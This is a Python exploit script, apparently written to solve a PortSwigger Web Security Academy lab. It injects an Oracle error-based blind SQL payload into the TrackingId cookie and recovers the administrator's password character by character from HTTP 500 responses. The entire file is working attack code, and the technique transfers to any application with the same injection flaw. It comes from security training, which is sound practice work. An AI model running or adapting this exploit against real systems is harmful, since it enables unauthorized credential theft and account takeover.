import requests
import string

# Burp extension: Copy as Python request
burp0_url = "https://0aad00bf04b1c9e280977b7500b000ee.web-security-academy.net:443/filter?category=Gifts"
burp0_cookies = {"TrackingId": "uCJ7mI0rBVrwmCh2", "session": "atBwgQfPUjtlmvPpcApSdisGREKd0QW1"}
burp0_headers = {"Sec-Ch-Ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aad00bf04b1c9e280977b7500b000ee.web-security-academy.net/filter?category=Lifestyle", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"}

def password_match(password: str):
    payload = f'\' union SELECT CASE WHEN (\'{password}\'=SUBSTR((SELECT password from users where username=\'administrator\'),1,{len(password)})) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--'
    cookies = burp0_cookies.copy()
    cookies['TrackingId'] = cookies['TrackingId'] + payload
    r = requests.get(burp0_url, headers=burp0_headers, cookies=cookies)
    if r.status_code >= 500:
        return True
    return False

CHARSET = string.ascii_lowercase + string.digits + "\000"

# Potentially this could be changed to perform binary search or to make all letters requests pararell to make it faster
password = ''
found_password = False 
while not found_password:
    found_password = True
    for character in CHARSET:
        if password_match(password + character):
            password += character
            print(password)

            found_password = False
            break
    
print(f"Found password: {password}")